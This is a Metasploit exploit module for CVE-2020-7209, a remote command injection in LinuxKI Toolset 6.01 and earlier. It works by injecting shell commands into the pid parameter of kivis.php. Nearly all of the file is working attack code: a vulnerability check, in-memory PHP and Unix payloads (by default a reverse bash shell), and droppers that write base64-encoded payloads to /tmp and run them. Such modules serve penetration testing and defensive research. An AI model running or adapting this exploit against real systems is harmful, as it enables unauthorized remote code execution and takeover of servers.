# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
        update_info(
          info,
          &#039;Name&#039; => &#039;LinuxKI Toolset 6.01 Remote Command Execution&#039;,
          &#039;Description&#039; => %q{
            This module exploits a vulnerability in LinuxKI Toolset <= 6.01 which allows remote code execution.
            The kivis.php pid parameter received from the user is sent to the shell_exec function, resulting in security vulnerability.
          },
          &#039;License&#039; => MSF_LICENSE,
          &#039;Author&#039; =>
              [
                &#039;Cody Winkler&#039;, # discovery and poc
                &#039;numan tÃ¼rle&#039; # msf exploit
              ],
          &#039;References&#039; =>
              [
                [&#039;EDB&#039;, &#039;48483&#039;],
                [&#039;CVE&#039;, &#039;2020-7209&#039;],
                [&#039;PACKETSTORM&#039;, &#039;157739&#039;],
                [&#039;URL&#039;, &#039;https://github.com/HewlettPackard/LinuxKI/commit/10bef483d92a85a13a59ca65a288818e92f80d78&#039;]
              ],
          &#039;Privileged&#039; => false,
          &#039;Platform&#039; => [&#039;php&#039;, &#039;unix&#039;, &#039;linux&#039;],
          &#039;Arch&#039; => [ARCH_PHP, ARCH_CMD, ARCH_X86, ARCH_X64],
          &#039;Targets&#039; =>
              [
                [
                  &#039;Automatic (PHP In-Memory)&#039;,
                  &#039;Platform&#039; => &#039;php&#039;,
                  &#039;Arch&#039; => ARCH_PHP,
                  &#039;Type&#039; => :php_memory,
                  &#039;Payload&#039; => { &#039;BadChars&#039; => "&#039;" },
                ],
                [
                  &#039;Automatic (PHP Dropper)&#039;,
                  &#039;Platform&#039; => &#039;php&#039;,
                  &#039;Arch&#039; => ARCH_PHP,
                  &#039;Type&#039; => :php_dropper,
                ],
                [
                  &#039;Automatic (Unix In-Memory)&#039;,
                  &#039;Platform&#039; => &#039;unix&#039;,
                  &#039;Arch&#039; => ARCH_CMD,
                  &#039;Type&#039; => :unix_memory,
                  &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_bash&#039; }
                ],
                [
                  &#039;Automatic (Linux Dropper)&#039;,
                  &#039;Platform&#039; => &#039;linux&#039;,
                  &#039;Arch&#039; => [ARCH_X86, ARCH_X64],
                  &#039;Type&#039; => :linux_dropper,
                ]
              ],
          &#039;DisclosureDate&#039; => &#039;May 17 2020&#039;,
          &#039;DefaultTarget&#039; => 0
        )
    )

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/&#039;]),
    ])
    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable dir for droppers&#039;, &#039;/tmp&#039;])
    ])
  end

  def check
    findstr = rand_str
    res = execute_command("echo &#039;#{findstr}&#039;")
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if (res.code == 404) || (res.code == 403)
    if (res.code == 200) && res.body.include?(findstr)
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
  end

  def execute_command(cmd, _opts = {})
    send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;linuxki/experimental/vis/&#039;, &#039;kivis.php&#039;),
      &#039;vars_get&#039; => {
        &#039;type&#039; => &#039;kitrace&#039;,
        &#039;pid&#039; => "1;#{cmd};"
      }
    })
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
  end

  def exploit
    unless datastore[&#039;ForceExploit&#039;]
      if check == CheckCode::Safe
        fail_with(Failure::NotVulnerable, &#039;Set ForceExploit to override&#039;)
      end
    end

    print_status("Executing #{target.name} target")

    print_status(&#039;Sending payload...&#039;)

    case target[&#039;Type&#039;]
    when :php_memory
      execute_command("php -r &#039;#{payload.encoded}&#039;")
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(linemax: 1_500)
    when :php_dropper
      dropper
    end

  end

  def dropper
    php_file = "#{rand_str}.php"
    tmp_file = Pathname.new(
      "#{datastore[&#039;WritableDir&#039;]}/#{php_file}"
    ).cleanpath

    dropper = get_write_exec_payload(
      writable_path: datastore[&#039;WritableDir&#039;],
      unlink_self: true # Worth a shot
    )

    dropper = Rex::Text.encode_base64(dropper)

    register_file_for_cleanup(tmp_file)

    execute_command("echo #{dropper} | base64 -d | tee #{tmp_file}")
    execute_command("php #{tmp_file}")
  end

  def rand_str
    Rex::Text.rand_text_alphanumeric(8..42)
  end
end

